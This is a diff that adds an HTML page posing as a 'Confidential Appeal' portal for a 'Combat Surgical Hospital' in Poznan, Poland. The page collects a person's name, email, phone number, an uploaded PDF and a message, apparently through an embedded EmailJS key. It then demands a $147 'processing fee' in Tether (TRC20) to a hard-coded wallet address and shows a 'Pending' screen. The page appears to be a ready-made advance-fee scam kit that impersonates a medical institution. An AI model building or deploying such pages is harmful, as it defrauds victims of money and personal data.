@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="971.png">
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
+    <title>97 C S H || Confidential Appeal</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="index.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("-SJe2Aj9INxsF6TZe");
+        })();
+    </script>
+</head>
+
+<body>
+    <div id="info" class="container">
+        <div name="myForm" id="contact" >
+            <h3><img src="971.png" width="40px" alt="97"> Combat Surgical Hospital <span> Poznan Poland</span></h3>
+            <h4>Confidential Appeal, Submit Your Appeal!</h4>
+            <fieldset>
+                <label for="name">Full Name</label>
+                <input id="name" name="fname" placeholder="Enter Your Name" type="text" tabindex="1" required autofocus>
+            </fieldset>
+            <fieldset>
+                <label for="email">Email Address</label>
+                <input id="email" name="fmail" placeholder="Enter Your Email" type="email" tabindex="2" required>
+            </fieldset>
+            <fieldset>
+                <label for="number">Phone Number</label>
+                <input id="number" name="fnum" placeholder="Enter Your Number" type="tel" tabindex="3" required>
+            </fieldset>
+            <fieldset>
+                <label for="file">Upload P D F</label>
+                <input id="file" name="file" type="file" tabindex="4" required>
+            </fieldset>
+            <fieldset>
+                <textarea id="message" name="fmes" placeholder="Type your Message Here...." tabindex="5" required></textarea>
+            </fieldset>
+            <fieldset id="check">
+                <input name="check" type="checkbox">
+                <label id="check" for="check">By submiting your Appeal you Agree and Abide with the submit
+                    Policy.</label>
+            </fieldset>
+            <fieldset >
+                <button id="button1" name="submit" onclick="sendMail()"  id="contact-submit" type="submit" value="Submit">Submit</button>
+            </fieldset>
+        </div>
+
+
+    </div>
+
+    <div id="pay" class="container">
+        <div id="contact">
+            <h3><img src="971.png" width="40px" alt="97"> Combat Surgical Hospital <span> Poznan Poland</span></h3>
+            <h4>Appeal Proccesing fee!</h4>
+
+            <div class="coin">
+                <h1>$ 147</h1>
+                <img src="usdt.jpeg" alt="" width="300px" >
+
+                <div class="usdt">
+                    <h2>TVUgBJszZnARAGwkpXbTd1Y2m4GqyKWVtv</h2>
+                    
+                    <div class="tooltip">
+                        <input id="address" type="text" value="TVUgBJszZnARAGwkpXbTd1Y2m4GqyKWVtv">
+                    
+                        <button onclick="copy()" onmouseout="outFunc()">
+                            <span class="tooltiptext" id="myTooltip">Copy to clipboard</span>
+                            <img src="file-copy-fill.png" alt="">
+                        </button>
+                    </div>
+                </div>
+                
+
+                <div class="warn">
+                    <img src="icon.png" alt="" width="28px">
+                    <p>Send only Tether (TRC20) to this address.</p>
+                </div>
+            </div>
+            <fieldset id="check">
+                <input name="check" type="checkbox">
+                <label id="check" for="check">Proof of payment will be resquested</label>
+            </fieldset>
+            <fieldset>
+                <button id="btn2" name="submit" type="submit" onclick="pending()" id="contact-submit" data-submit="...Sending">PAY</button>
+            </fieldset>
+        </div>
+
+
+    </div>
+
+
+        <div id="pend" class="container">
+            <div id="contact">
+                <h3><img src="971.png" width="40px" alt="97"> Combat Surgical Hospital <span> Poznan Poland</span></h3>
+                <h4>Your payment will be Proccesed!</h4>
+        
+                <div class="pend">
+                    <h1>Pending</h1>
+                    <img src="pending-icon.png" alt="" width="300px">
+
+                    <div class="warn">
+                    <img src="icon.png" alt="" width="28px">
+                        <p>Your Appeal and fee will be Proccesed</p>
+                    </div>
+                </div>
+            </div>
+        
+        
+        </div>
+    <script src="index.js"></script>
+</body>
+
+</html>
